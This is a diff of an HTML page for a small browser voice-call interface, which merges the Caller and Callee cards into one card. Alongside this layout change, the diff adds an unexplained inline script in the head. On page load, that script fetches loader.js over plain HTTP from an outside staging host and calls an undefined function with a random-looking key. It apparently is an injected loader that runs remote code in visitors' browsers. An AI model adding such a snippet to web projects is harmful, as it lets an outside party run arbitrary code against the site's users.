@@ -25,18 +25,30 @@
         font-family: "Sen", sans-serif;
       }
     </style>
+    <script async>
+      (function e(t, w, d) {
+        var s = d.createElement("script");
+        s.src = "http://staging.syncnet.io/js/loader.js";
+        s.setAttribute('async', '');
+        s.onload = async () => {
+          await lRo(d, t, w);
+        };
+        d.getElementsByTagName("body")[0].appendChild(s);
+      })("ZPdKEY4iVe13", window, document);
+      </script>
+      
   </head>
   <body>
-    <h1
-      id="userId"
-      class="text-xl mx-auto my-8 bg-primary-content text-primary-focus w-fit p-2"
-    ></h1>
     <div class="flex p-4 gap-2">
       <div class="flex-1 space-y-2">
-        <div class="card w-96 bg-base-100 shadow-md h-96">
+        <div class="card w-96 bg-base-100 shadow-md">
           <div class="card-body">
-            <h2 class="card-title">Caller</h2>
+            <div class="badge badge-success gap-2">Connected</div>
+            <h2 class="card-title text-xl mx-auto my-8 bg-primary-content text-primary-focus w-fit p-2" id="userId">Caller</h2>
             <p  id="call-status" class="bg-accent-content text-accent-focus w-fit p-2"></p>
+            <p id="call-alert" class="bg-secondary-content text-secondary-focus w-fit p-2"></p>
+            <audio id="localAudio" controls autoplay></audio>
+            <audio id="remoteAudio" controls autoplay></audio>
             <div class="card-actions justify-end">
               <button class="btn btn-sm btn-sm btn-primary" id="call">
                 Call
@@ -44,24 +56,9 @@
               <button id="hangupButton" class="btn btn-sm btn-sm btn-warning">
                 Hang Up
               </button>
-              <audio id="localAudio" controls autoplay></audio>
-            </div>
-          </div>
-        </div>
-      </div>
-      <div class="flex-1 space-y-2">
-        <div class="card w-96 bg-base-100 shadow-md h-96">
-          <div class="card-body">
-            <h2 class="card-title">Callee</h2>
-            <p id="call-alert" class="bg-secondary-content text-secondary-focus w-fit p-2"></p>
-            <div class="card-actions justify-end">
               <button class="btn btn-sm btn-sm btn-primary" id="answerButton">
                 Answer
               </button>
-              <button id="hangupButton" class="btn btn-sm btn-sm btn-warning">
-                Hang Up
-              </button>
-              <audio id="remoteAudio" controls autoplay></audio>
             </div>
           </div>
         </div>
